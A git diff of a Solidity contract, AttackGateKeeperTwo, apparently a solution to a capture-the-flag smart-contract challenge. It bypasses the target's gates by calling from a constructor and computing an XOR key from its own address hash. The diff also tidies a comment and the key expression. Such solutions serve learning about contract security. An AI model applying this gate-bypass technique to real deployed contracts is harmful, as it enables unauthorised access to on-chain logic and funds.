@@ -13,12 +13,16 @@ pragma solidity ^0.6.0;
 
 // to pass modifier 1 need to make msg.sender != tx.origin
 contract AttackGateKeeperTwo {
-    // to pass modifier 2 we need x == 0 in which extcode is only euql to zero on initialization(constructor to achieve this)
+    // to pass modifier 2 we need x == 0 in which extcode is only equal to zero on initialization(constructor to achieve this)
     constructor(address _gateTwoAddress) public {
         // to pass modifier 3 adjust key to meet requirement by knowledge of ^ XOR
+        // bytes8 key = bytes8(
+        //     uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0xffffffffffffffff)
+        // );
         bytes8 key = bytes8(
-            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0xffffffffffffffff)
+            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1)
         );
+
         address(_gateTwoAddress).call(abi.encodeWithSignature("enter(bytes8)", key));
     }
 }
